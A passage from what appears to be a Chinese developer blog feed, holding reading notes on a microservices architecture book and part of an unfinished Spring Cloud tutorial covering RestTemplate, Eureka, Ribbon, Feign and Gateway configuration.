共享库技术</h4><ul><li>基本上所有的语言都支持将整个代码库分解为多个库，这是一种非常标准的分解技术，库可以由第三方或者自己组织提供</li><li>存在缺点：<ul><li><ol><li>无法选择异构的技术</li></ol><ul><li>一般来讲，一种库中只能存在一种语言，或者至少在同一个平台上使用</li></ul></li><li><ol start="2"><li>会失去独立地对系统某一部分进行扩展的能力，除非是用的是动态链接库，否则每次当库有更新的时候，都需要重新部署整个进程</li></ol></li><li><ol start="3"><li>最糟糕的影响：缺少一个比较明显的接缝来建立架构的安全性保护措施，从而无法保证系统的弹性</li></ol></li></ul></li></ul><h4 id="1.4.2-%E6%A8%A1%E5%9D%97" tabindex="-1">1.4.2 模块</h4><ul><li>有些语言提供了模块分解技术，允许对模块进行生命周期管理，这样就可以把模块部署到运行的进程中，并且可以在不停止整个进程的前提下对某个模块进行更改</li><li>模块分解技术<ul><li>OSGI（Open Source Gateway Initiative,开放服务网关协议）</li><li>Erlang</li></ul></li><li>缺点与共享库类似：大大限制我们采用新技术和独立队服务进行扩展的能力，且有可能会导致使用过度耦合的集成技术，同时也缺乏相应的接缝来进行架构的安全性保护</li></ul><h3 id="1.5-%E6%B2%A1%E6%9C%89%E9%93%B6%E5%BC%B9-%26-1.6-%E5%B0%8F%E7%BB%93" tabindex="-1">1.5 没有银弹 &amp; 1.6 小结</h3><ul><li>微服务不是免费的午餐，更不是银弹，如果你想要得到一条通用准则，那么微服务是一个错误的决定</li><li>到目前为止，已经了解到<ul><li>什么是微服务</li><li>微服务和其他组合技术有什么不同</li><li>微服务的好处</li></ul></li><li>后续将讨论如何得到这些好处及如何避免一些常见的陷阱</li></ul><h2 id="%E7%AC%AC2%E7%AB%A0-%E6%BC%94%E5%8C%96%E5%BC%8F%E6%9E%B6%E6%9E%84%E5%B8%88" tabindex="-1">第2章 演化式架构师</h2><ul><li>本章中架构师职责的观点是作者个人简介，其希望能对象牙塔中的定义发起攻击</li></ul><h3 id="2.1-%E4%B8%8D%E5%87%86%E7%A1%AE%E7%9A%84%E6%AF%94%E8%BE%83" tabindex="-1">2.1 不准确的比较</h3><ul><li>计算机行业很年轻，因此社会很难理解我们，我们也不清楚自己到底在干什么</li><li>所以我们尝试借鉴其他行业，把自己称作软件“工程师”或建筑师，然而，建筑师和工程师所具有的精确性和纪律性是遥不可及的。在英国至少需要7年才能成为建筑师，而很多IT证书并没有什么价值。</li><li>有些人想要得到认可，所以借鉴了这些广为人知的行业中的名词，这样借鉴也会造成两个问题<ul><li>首先，这么做的前提是我们应该清楚自己应该是干什么的，而事实并非如此<ul><li>建筑和桥梁倒塌的次数远比程序崩溃的次数少，所以和工程师比是不公平的</li></ul></li><li>其次，这种类比很奇怪<ul><li>如果将桥梁建筑和编程类似的话，那么建到一半可能会发现对岸比预想的要远50米，而且材质是花岗岩而不是泥土。</li></ul></li><li>事实上，我们要创造的东西从设计上来说就要足够灵活，有很好的适应性，并且能够根据用户的需求进行演化</li></ul></li><li>如今架构师的定义逐渐被人接受，本书将尽力去重定义它</li></ul><h3 id="2.2-%E6%9E%B6%E6%9E%84%E5%B8%88%E7%9A%84%E6%BC%94%E5%8C%96%E8%A7%86%E8%A7%92" tabindex="-1">2.2 架构师的演化视角</h3><ul><li>与建筑师相比，在软件中有大量的需求变更，使用的工具和技术既有多样性。</li><li>一个角色可以和架构师相类比：城市规划师</li><li>架构师的职责之一就是保证该系统的开发人员适合在其上工作</li></ul><h3 id="2.3-%E5%88%86%E5%8C%BA" tabindex="-1">2.3 分区</h3><ul><li>与城市规划师类比<ul><li>区域-服务</li><li>应更多关注服务之间的事情，而不是服务内部</li></ul></li></ul><h3 id="2.4-%E4%B8%80%E4%B8%AA%E5%8E%9F%E5%88%99%E6%80%A7%E7%9A%84%E6%96%B9%E6%B3%95" tabindex="-1">2.4 一个原则性的方法</h3><ul><li><p>做系统设计方面的决定通常是在取舍，而在微服务架构中，需要更多的取舍</p></li><li><p>战略目标：架构师不需要定义战略目标，战略目标关心的是公司的走向以及如何让公司满意，这些目标的层次都比较高，但通常不会涉及技术层面</p></li><li><p>原则：为了和大目标保持一致，我们会指定一些具体的规则，称为原则，但原则并不是一成不变的</p></li><li><p>实践：我们通过实践来保证原则能够得到实施，这些实践能指导我们如何完成任务。</p><ul><li>通常实践是技术相关的，而且是底层的，包括代码规范，日志数据集集中捕获等</li><li>实践应该巩固原则</li></ul></li><li><p>将原则和实践相结合</p><ul><li>原则和实践是相对的，比如，可以把使用HTTP/REST作为原则而不是实践，但关键是要有一些重要的原则来指导系统的演化</li></ul></li><li><p>真实世界的例子<img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1/2-1.jpg" alt></p><ul><li>几年间，时间变动很频繁，而原则基本没有变</li><li>上面提到的名词可以使用文档来职场，也可以提供示例代码，搞好的方法是创造工具保证事情的正确性</li></ul></li></ul><h3 id="2.5-%E8%A6%81%E6%B1%82%E7%9A%84%E6%A0%87%E5%87%86" tabindex="-1">2.5 要求的标准</h3><ul><li><p>系统应该由很多小但有生命周期的组件构成，这些组件之间有着紧密的联系。</p></li><li><p>所以在优化单个服务自治性的同时，也要兼顾全局，一种能帮我们实现平衡的方法就是，清楚地定义出一个好服务应有的属性</p></li><li><p>监控</p><ul><li>能够清晰地描绘出跨服务系统的健康状态十分关键，这必须在系统级别而非单个服务级别进行考虑</li><li>建议所有的服务使用同样的方式报告健康状态及其监控的数据</li></ul></li><li><p>接口：选用少数几种明确的接口技术有助于使用者的集成。</p></li><li><p>架构安全性：一个运行异常的服务可能毁了整个系统，因此要保证每个服务可以应对下游服务的错误请求。</p></li></ul><h3 id="2.6-%E4%BB%A3%E7%A0%81%E6%B2%BB%E7%90%86" tabindex="-1">2.6 代码治理</h3><ul><li><p>达成共识的方法：</p></li><li><p>范例：提供代码范例，当系统中有好的代码范例时，开发人员也不会错得离谱</p><ul><li>理想情况下，提供的优秀范例应当来自真是项目，而不是专门实现的完美例子</li></ul></li><li><p>裁剪服务代码模板</p><ul><li>当开发人员想要实现一个新的服务时，所有实现核心属性的那些代码应该是现成的</li><li>针对自己的开发实践裁剪出一个服务代码模板，不但可以开发出开发速度，还可以保证服务的质量<ul><li>针对不同技术栈，都需要一个服务代码模板</li></ul></li></ul></li></ul><h3 id="2.7-%E6%8A%80%E6%9C%AF%E5%80%BA%E5%8A%A1" tabindex="-1">2.7 技术债务</h3><ul><li>有时为了实现紧急的特性，可能会忽略一些约束，短期内可能会获得利益，但长期是会付出代价的，这就是技术债务。</li><li>系统的目标发生变化时，且与现有事实不符，此时也会产生技术债务</li></ul><h3 id="2.8-%E4%BE%8B%E5%A4%96%E7%AE%A1%E7%90%86" tabindex="-1">2.8 例外管理</h3><ul><li>当系统偏离指导会发生什么？<ul><li>有时候我们会针对某个规则破一次例，然后把他们记录下来。如果这个例外出现了很多次，那就可以通过修改原则和实践的方法把我们的理解固化下来。</li></ul></li></ul><h3 id="2.9-%E9%9B%86%E4%B8%AD%E6%B2%BB%E7%90%86%E5%92%8C%E9%A2%86%E5%AF%BC" tabindex="-1">2.9 集中治理和领导</h3><ul><li><p>架构师的部分职责时治理：</p><ul><li>治理通过评估干系人的需求，当前情况及下一步的可能性来确保企业目标的达成，通过排优先级和做决策来设定方向，对于已经达成一致的方向和目标进行监督</li></ul></li><li><p>架构师的一个职责是确保有一个技术愿景，那么治理就是要确保我们构建的系统符合这个愿景，必要时应对愿景进行演化。</p></li><li><p>架构师需要确保有一组可以指导开发的原则，且这些原则要与组织的战略相符</p><ul><li>他们还需要确保，以这些原则为指导衍生出来的实践不会给开发人员带来痛苦。</li></ul></li><li><p>此时可以成立一个治理小组，小组由技术专家领导，且有一线人员</p><ul><li>一种模式是架构师领导这个小组，每个交付团队都有人参加，架构师负责确保该组织的正常运作，整个小组对治理负责</li></ul></li></ul><h3 id="2.10-%E5%BB%BA%E8%AE%BE%E5%9B%A2%E9%98%9F" tabindex="-1">2.10 建设团队</h3><ul><li><p>对于一个系统技术愿景的主要负责人来说，执行愿景不仅仅等同于做技术决定，和你在一起工作的人自然会做出技术决定</p></li><li><p>对于技术领导者来说，更重要的是帮助你的队友成长，帮助他们理解这个愿景，并保证他们可以积极地参与到愿景的实现和调整中去。</p></li><li><p>在单块系统中，人们为某些事情负责的机会非常少，而在微服务架构种存在多个自治的代码看，每个代码库有自己独立的生命周期，这给更多人提供了对单个服务负责的机会。帮助他们成长，同时通过分担责任也可以防止某一个人负担过重</p></li></ul><h3 id="2.11-%E6%84%BF%E6%99%AF" tabindex="-1">2.11 愿景</h3><ul><li><p>本书认为一个演进式架构师应承担的责任</p><ul><li>愿景<ul><li>确保在系统级有一个经过充分沟通的技术愿景，这个愿景应该可以帮助你满足客户和组织的需求</li></ul></li><li>同理心<ul><li>理解你所做的决定的客户和同时带来的影响</li></ul></li><li>合作<ul><li>和尽量多的同事进行沟通，从而更好地对愿景进行定义，修订及执行</li></ul></li><li>适应性<ul><li>确保在你的客户和组织需要的时候调整技术愿景</li></ul></li><li>自治性<ul><li>在标准化和团队自制之间寻找一个正确的平衡点</li></ul></li><li>治理<ul><li>确保系统按照技术愿景执行</li></ul></li></ul></li><li><p>在下一章，让我们带着对架构师的认识开始寻找微服务之间的正确边界</p></li></ul><h2 id="%E7%AC%AC3%E7%AB%A0-%E5%A6%82%E4%BD%95%E5%BB%BA%E6%A8%A1%E6%9C%8D%E5%8A%A1" tabindex="-1">第3章 如何建模服务</h2><h3 id="3.1-musiccorp%E7%AE%80%E4%BB%8B" tabindex="-1">3.1 MusicCorp简介</h3><ul><li>讨论想法的书最好有例子辅助，本书例子 在线零售商Musiccorp.</li><li>MusicCorp最初是实体店经营，在唱片收益跌入谷底后将注意力放到了网上</li><li>它认为赢得世界的方法是，保证自己很容易对应用进行修改，这正是微服务的用武之处</li></ul><h3 id="3.2-%E4%BB%80%E4%B9%88%E6%A0%B7%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%98%AF%E5%A5%BD%E6%9C%8D%E5%8A%A1" tabindex="-1">3.2 什么样的服务是好服务</h3><h4 id="3.2.1-%E6%9D%BE%E8%80%A6%E5%90%88" tabindex="-1">3.2.1 松耦合</h4><ul><li><p>实现松耦合，那么修改一个服务就不需要修改另一个服务</p></li><li><p>使用微服务的最重要一点：能够独立修改和部署单个服务而不需要修改系统的其他部分</p></li><li><p>紧耦合的原因</p><ul><li>使用紧耦合的方式做服务间的集成</li><li>过度的服务间的通信可能会导致紧耦合</li></ul></li></ul><h4 id="3.2.2-%E9%AB%98%E5%86%85%E8%81%9A" tabindex="-1">3.2.2 高内聚</h4><ul><li><p>内聚原因：改变某一行为时，只在一个地方进行修改，然后尽快发布</p></li><li><p>否则，需要同时发布多个微服务才能交付这个功能</p></li><li><p>找到问题域的边界就可以确保相关的行为能发在同一个地方，并且他们会和其它边界尽量以松耦合的形式进行通信</p></li></ul><h3 id="3.3-%E9%99%90%E7%95%8C%E4%B8%8A%E4%B8%8B%E6%96%87" tabindex="-1">3.3 限界上下文</h3><ul><li>在Eric Evans的领域驱动设计中，Evans引入了 限界上下文的概念<ul><li>他任务一个给定的领域包含多个限界上下文，每个限界上下文中的模型分成两部分，一部分需要和外部通信，另一部分不需要</li><li>每个上下文都有明确的的接口，接口决定了它会暴露那些模型给其他上下文</li></ul></li><li>另一个限界上下文的定义：一个由显示边界限定的特定职责</li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 微服务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微服务技术栈（未完）</title>
      <link href="/2023/08/16/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/"/>
      <url>/2023/08/16/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><p><a href="https://www.bilibili.com/video/BV1LQ4y127n4/?p=1">视频地址</a></p><p><img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88%E5%9B%BE.jpg" alt="微服务技术栈图"></p><h2 id="%E8%AE%A4%E8%AF%86%E5%BE%AE%E6%9C%8D%E5%8A%A1" tabindex="-1">认识微服务</h2><h3 id="01-%E6%9C%8D%E5%8A%A1%E6%A1%86%E6%9E%B6%E6%BC%94%E5%8F%98" tabindex="-1">01 服务框架演变</h3><ul><li>单体架构<ul><li>概念：将业务的所有功能集中在一个项目中进行开发，打成一个包部署</li><li>优点：架构简单，部署成本低</li><li>缺点：耦合度高</li></ul></li><li>分布式架构<ul><li>概念：根据业务功能对系统进行拆分，每个业务模块作为独立项目开发，成为一个服务</li><li>优点：降低服务耦合，有利于服务拓展升级</li><li>考虑问题：<ul><li>服务拆分粒度如何？</li><li>服务集群地址如何维护？</li><li>服务之间如何实现远程调用？</li><li>服务健康状态如何感知？</li></ul></li></ul></li><li>微服务：是一种经过良好架构设计的分布式架构方案<ul><li>微服务架构特征：<ul><li>单一职责：微服务拆分粒度更小，每一个服务都对应唯一的业务能力，做到单一职责，避免重复业务开发</li><li>面向服务：微服务对外暴露业务接口</li><li>自治：团队独立，技术独立，数据独立，部署独立</li><li>隔离性强：服务调用做好隔离，容错，降级，避免出现级联问题</li></ul></li></ul></li></ul><h3 id="02-%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E5%AF%B9%E6%AF%94" tabindex="-1">02 微服务技术对比</h3><ul><li>微服务这种方案需要技术框架来落地，国内最知名为SpringCloud和阿里巴巴的Duddo<br><img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E5%AF%B9%E6%AF%94.jpg" alt="微服务技术对比"></li></ul><h3 id="03-springcloud" tabindex="-1">03 SpringCloud</h3><ul><li>SpringCloud是目前全球使用最广泛的微服务框架</li><li>SpringCloud集成了各种微服务功能组件，并基于SpringBoot实现了这些组件的自动装配，从而提供了良好的开箱即用体验</li><li>SpringCloud和SpringCloud搭配使用需要注意版本兼容</li></ul><h2 id="%E6%9C%8D%E5%8A%A1%E6%8B%86%E5%88%86%E4%B8%8E%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8" tabindex="-1">服务拆分与远程调用</h2><h3 id="01-%E6%9C%8D%E5%8A%A1%E6%8B%86%E5%88%86" tabindex="-1">01 服务拆分</h3><ul><li>服务拆分注意事项<ul><li><ol><li>不同微服务，不要重复开发相同业务</li></ol></li><li><ol start="2"><li>微服务数据独立，不要访问其它微服务的数据库</li></ol></li><li><ol start="3"><li>微服务可以将自己的业务暴露为接口，供其它微服务调用</li></ol></li></ul></li></ul><h3 id="02-%E6%9C%8D%E5%8A%A1%E9%97%B4%E8%B0%83%E7%94%A8" tabindex="-1">02 服务间调用</h3><ul><li><p>微服务调用方式</p><ul><li>基于RestTemplate发起的http请求实现远程调用</li><li>http请求做远程调用是与语言无关的调用，只需直到对方的ip，端口，接口路径，请求参数即可</li></ul></li><li><p>步骤：</p><ul><li><ol><li>注册RestTemplate</li></ol></li></ul><pre><code class="language-java"> @Bean  public RestTemplate restTemplate()&#123;      return new RestTemplate();  &#125;</code></pre><ul><li><ol start="2"><li>服务远程调用RestTempla</li></ol></li></ul><pre><code class="language-java">  @GetMapping(&quot;&#123;orderId&#125;&quot;)  public Order queryOrderByUserId(@PathVariable(&quot;orderId&quot;) Long orderId) &#123;      // 1. 查询订单      Order order=orderService.queryOrderById(orderId);      // 2. 利用RestTemplate发起http请求，查询用户      //(1)url路径      String url=&quot;http://localhost:8081/user/&quot;+order.getUserId();      //(2)发送http请求，实现远程调用      User user=restTemplate.getForObject(url,User.class);      // 3. 封装user到Order      order.setUser(user);      // 4. 返回      return order;  &#125;</code></pre></li><li><p>服务调用关系</p><ul><li>服务提供者：暴露接口给其它微服务调用</li><li>服务消费者：调用其他微服务提供的接口</li><li>提供者和消费者角色是相对的</li><li>一个服务可以同时是服务提供者和消费者</li></ul></li></ul><h2 id="eureka-%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83" tabindex="-1">Eureka 注册中心</h2><h3 id="01-%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8%E7%9A%84%E9%97%AE%E9%A2%98" tabindex="-1">01 远程调用的问题</h3><ul><li>服务消费者该如何获取服务提供者的地址信息?</li><li>如果有多个服务者，消费者如何选择?</li><li>消费者如何得知服务提供者的健康状态?</li></ul><h3 id="02-eureka%E5%8E%9F%E7%90%86" tabindex="-1">02 eureka原理</h3><p><img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/Eureka%E4%BD%9C%E7%94%A8%E5%9B%BE.jpg" alt></p><ul><li><p>服务消费者该如何获取服务提供者的地址信息?</p><ul><li>服务提供者启动时向eureka注册自己的信息</li><li>eureka保存这些信息</li><li>消费者根据服务名称向eureka拉取提供者信息</li></ul></li><li><p>如果有多个服务者，消费者如何选择?</p><ul><li>服务消费者利用负载均衡算法选择一个执行</li></ul></li><li><p>消费者如何得知服务提供者的健康状态?</p><ul><li>服务提供者每30s向eurekaServer发送心跳请求，报告健康状态</li><li>eureeure</li></ul></li><li><p>在Eureka架构中，微服务角色有两类</p><ul><li>EurekaServer：服务端，注册中心<ul><li>记录服务信息，心跳监控</li></ul></li><li>EureClient：客户端<ul><li>Provider：服务提供者<ul><li>注册自己的信息到EurekaServer</li><li>每隔30s向EurekaServer发送心跳</li></ul></li><li>consumer：服务消费者<ul><li>根据服务名称从EurekaServer拉取服务列表</li><li>基于服务列表做负载均衡，选中一个微服务后发起远程调用</li></ul></li></ul></li></ul></li></ul><h3 id="03-%E6%90%AD%E5%BB%BAeurekaserver" tabindex="-1">03 搭建EurekaServer</h3><ul><li>搭建步骤<ul><li><ol><li>创建项目，引入依赖</li></ol></li></ul><pre><code class="language-xml">&lt;dependency&gt;      &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;      &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt;  &lt;/dependency&gt;</code></pre><ul><li><ol start="2"><li>编写启动类，添加@EnableEurekaServer注解</li></ol></li></ul><pre><code class="language-java">  @EnableEurekaServer  @SpringBootApplication  public class EurekaApplication &#123;  public static void main(String[] args) &#123;      SpringApplication.run(EurekaApplication.class,args);      &#125;  &#125;</code></pre><ul><li><ol start="3"><li>添加application.yml文件，编写配置</li></ol></li></ul><pre><code class="language-yaml">  server:      port: 10086  spring:      application:          name: eurekaserver #eureka服务名称  eureka:      client:          service-url:              defaultZone: http://127.0.0.1:10086/eureka</code></pre></li></ul><h3 id="04-%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C" tabindex="-1">04 服务注册</h3><ul><li>步骤如下：<ul><li><ol><li>在user-service项目引入<code>spring-cloud-starter-netflix-eureka-client</code>的依赖</li></ol></li></ul><pre><code class="language-xml">  &lt;dependency&gt;      &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;      &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;  &lt;/dependency&gt;</code></pre><ul><li><ol start="2"><li>在<code>application.yml</code>文件，编写下面配置</li></ol></li></ul><pre><code class="language-yaml">  server:      port: 10086  spring:      application:          name: eurekaclient #eureka服务名称  eureka:      client:          service-url:              defaultZone: http://127.0.0.1:10086/eureka</code></pre></li></ul><h3 id="05-%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0" tabindex="-1">05 服务发现</h3><ul><li>服务拉取是基于服务名称获取服务列表，然后在对服务列表做负载均衡<ul><li><ol><li>修改代码，修改url路径，用服务名代替ip和端口号<br><code>String url=&quot;http://userservice/user/&quot;+order.getUserId();</code></li></ol></li><li><ol start="2"><li>在项目启动类中添加负载均衡注解</li></ol></li></ul><pre><code class="language-java">    @LoadBalanced  public RestTemplate restTemplate()&#123;      return new RestTemplate();  &#125;</code></pre></li></ul><h2 id="ribbon-%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%8E%9F%E7%90%86" tabindex="-1">Ribbon 负载均衡原理</h2><h3 id="01-%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%8E%9F%E7%90%86" tabindex="-1">01 负载均衡原理</h3><p><img src="images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E6%B5%81%E7%A8%8B.jpg" alt="负载均衡流程"><br><img src="images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E6%B5%81%E7%A8%8B2.jpg" alt="负载均衡流程2"></p><h3 id="02-%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%AD%96%E7%95%A5" tabindex="-1">02 负载均衡策略</h3><p><img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%AD%96%E7%95%A5.jpg" alt="负载均衡策略"></p><ul><li>通过定义rule可以修改负载均衡规则<ul><li><ol><li>代码方式：在order-service中的OrderApplication类中，定义一个新的Rule，这种方法会对整个项目起作用，配置灵活，但修改时需要重新打包</li></ol></li></ul><pre><code class="language-java">@Beanpublic IRule randomRule()&#123;  return new RandomRule();&#125;</code></pre><ul><li><ol start="2"><li>配置文件方式：在order-service的application.yml文件中，添加新的配置也可以修改规则,直观方便，不需要重新打包，但无法做全局配置</li></ol></li></ul><pre><code class="language-yml">userservice:  ribbon:    NFLoadBalancerRuleClassName:com.netflix.loadbalancer.RandomRule</code></pre></li></ul><h3 id="03-%E6%87%92%E5%8A%A0%E8%BD%BD" tabindex="-1">03 懒加载</h3><ul><li>Ribbon默认是采用懒加载，即第一访问时才回去创建LoadBalanceClient，请求时间较长。</li><li>而饥饿加载会在项目启动时创建，降低第一次访问的时间消耗，通过下面配置饥饿加载</li></ul><pre><code class="language-yml">ribbon:  eager-load:    enabled: true    clients: userservice # 指定对userservice这个服务饥饿加载</code></pre><h2 id="nacos-%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83" tabindex="-1">Nacos 注册中心</h2><p>这里暂时不需要，以后再来填坑<br><img src="https://www.bilibili.com/video/BV1LQ4y127n4?p=17&amp;spm_id_from=pageDriver&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072" alt="视频地址"></p><h2 id="http%E5%AE%A2%E6%88%B7%E7%AB%AFfeign" tabindex="-1">http客户端Feign</h2><h3 id="01-feign%E6%9B%BF%E4%BB%A3resttemplate" tabindex="-1">01 Feign替代RestTemplate</h3><ul><li><p>RestTempla存在的问题</p><pre><code class="language-java">String url=&quot;http://userservice/user/&quot;+order.getUserId();User user=restTemplate.getForObject(url,User.class);</code></pre><ul><li>代码可读性差，编程体验不统一</li><li>参数复杂URL难以维护</li></ul></li><li><p>Feign 是一个声明式htpp客户端，其作用可以让我们更优雅的实现http发送请求</p></li><li><p>定义和使用Feign客户端：</p><ul><li><ol><li>引入依赖</li></ol></li></ul><pre><code class="language-xml">  &lt;dependency&gt;    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;    &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;  &lt;/dependency&gt;</code></pre><ul><li><ol start="2"><li>在order-service的启动类中添加注解开启Feign开关<code>@EnableFeignClients</code></li></ol></li><li><ol start="3"><li>编写Feign客户端，主要基于SpringMVC的注解来声明说成调用信息</li></ol></li></ul><pre><code class="language-java">@FeignClient(&quot;userservice&quot;)public interface UserClient &#123;  @GetMapping(&quot;/user/&#123;id&#125;&quot;)  User findById(@PathVariable(&quot;id&quot;) Long id);&#125;</code></pre><ul><li><ol start="4"><li>使用FeignClien中定义的方法代替RestTemplate</li></ol></li></ul><pre><code class="language-java">public Order queryOrderById(Long orderId) &#123;      // 1.查询订单      Order order = orderMapper.findById(orderId);      // 2. 利用Feign远程调用      User user=userClient.findById(order.getUserId());      // 3。 封装user到Order      order.setUser(user);      // 4.返回      return order;  &#125;</code></pre></li></ul><h3 id="02-%E8%87%AA%E5%AE%9A%E4%B9%89%E9%85%8D%E7%BD%AE" tabindex="-1">02 自定义配置</h3><p><img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/Feign%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89%E9%85%8D%E7%BD%AE.jpg" alt></p><ul><li>配置feign的日志<ul><li><ol><li>配置文件方式</li></ol></li></ul><pre><code class="language-yaml">feign:  client:    config:      default/userservice: #默认为全局配置，或使用服务名仅针对某个服务         loggerLevel: FULl # 日志级别</code></pre><ul><li><ol start="2"><li>使用java代码</li></ol></li></ul><pre><code class="language-java">public class DefaultFeignConfiguration &#123;  @Bean  public Logger.Level logLevel()&#123;return Logger.Level.BASIC;&#125;&#125;</code></pre></li></ul><h3 id="03-feign%E4%BD%BF%E7%94%A8%E4%BC%98%E5%8C%96" tabindex="-1">03 Feign使用优化</h3><ul><li>优化手段<ul><li><ol><li>使用连接池代替默认的URLConnection</li></ol><ul><li>引入HTTPClient依赖</li></ul></li></ul><pre><code class="language-xml">&lt;dependency&gt;    &lt;groupId&gt;io.github.openfeign&lt;/groupId&gt;    &lt;artifactId&gt;feign-httpclient&lt;/artifactId&gt;&lt;/dependency&gt;</code></pre><pre><code class="language-yml">feign:  httpclient:    enable: true # 支持HttpClient开关    max-connections: 200 #最大连接数    max-connections-per-route: 50 #单个路径最大连接数</code></pre><ul><li><ol start="2"><li>日志级别，最好用basic或none</li></ol></li></ul></li></ul><h3 id="04-%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5" tabindex="-1">04 最佳实践</h3><ul><li><ol><li>继承：给消费者的FeignClient和提供者的controller定义统一的父接口作为标准</li></ol><ul><li>服务紧耦合（API已经相同了）</li><li>父接口参数列表中的映射不会被继承</li></ul></li><li><ol start="2"><li>抽取：将FeignClient抽取为独立模块，并且把接口有关的POJO，默认的Feign配置都放到这个模块中，提供给所有消费者使用</li></ol></li><li><p>抽取实践</p><ul><li>步骤：<ul><li><ol><li>首先创建一个module，命名为feign-api，然后引入feign的starter依赖</li></ol></li><li><ol start="2"><li>将order-service中编写的UserClient，User，DefaultFeignConfiguration都复制到feign-api项目中</li></ol></li><li><ol start="3"><li>在order-service中引入feign-api依赖</li></ol></li><li><ol start="4"><li>修改order-service中的所有与上述三个组件相关部分的import部分，改成导入feign-api的包</li></ol></li><li><ol start="5"><li>重启测试</li></ol></li></ul></li><li>当定义的FeignClient不在SpringBootApplication的扫描包范围时，这些FeignClien无法使用，有两种解决办法<ul><li><ol><li>指定FeignClient所在包<code>@EnableFeignClients(basePackages=&quot;cn.itcast.feign.clients&quot;)</code></li></ol></li><li><ol start="2"><li>指定FeignCLient字节码<code>@EnableFeignClients(clients=&#123;UserClient&#125;)</code></li></ol></li></ul></li></ul></li></ul><h2 id="%E7%BB%9F%E4%B8%80%E7%BD%91%E5%85%B3gateway" tabindex="-1">统一网关Gateway</h2><h3 id="01-%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E7%BD%91%E5%85%B3" tabindex="-1">01 为什么需要网关</h3><ul><li><p>网关功能</p><ul><li>身份认证和权限校验</li><li>服务路由，负载均衡</li><li>请求限流</li></ul></li><li><p>在springcloud中网关的实现有两种</p><ul><li>gateway和zuul</li><li>zuul是基于Servlet的实现，属于阻塞式编程。</li><li>而SpringCloudGateway则是属于Spring5中提供的WebFlux，属于响应式编程的实现，具有更好的性能。</li></ul></li></ul><h3 id="02-gateway%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8" tabindex="-1">02 gateway快速入门</h3><ul><li>搭建网关服务的步骤<ul><li><ol><li>创建新的moudle，引入SpringCloudGateway的依赖和eureka的服务发现依赖</li></ol></li></ul><pre><code class="language-xml">&lt;!--gateway--&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;    &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!--eureka--&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;    &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;</code></pre><ul><li><ol start="2"><li>编写路由配置及eureka地址</li></ol><ul><li>路由配置包括：<ul><li><ol><li>路由id：路由的唯一标识</li></ol></li><li><ol start="2"><li>路由目标uri：路由的目标地址，http代表目标地址，lb代表根据服务名负载均衡</li></ol></li><li><ol start="3"><li>路由断言predicates：判断路由的规则</li></ol></li><li><ol start="4"><li>路由过滤器filters：对请求或响应做处理</li></ol></li></ul></li></ul></li></ul><pre><code class="language-yml">server:port: 10010spring:  application:    name: gateway  cloud:    gateway:      routes:        - id: user-service # 路由标识          uri: lb://userservice #路由的目标地址          predicates: #路由断言，判断请求是否符合规则            - Path=/user/** # 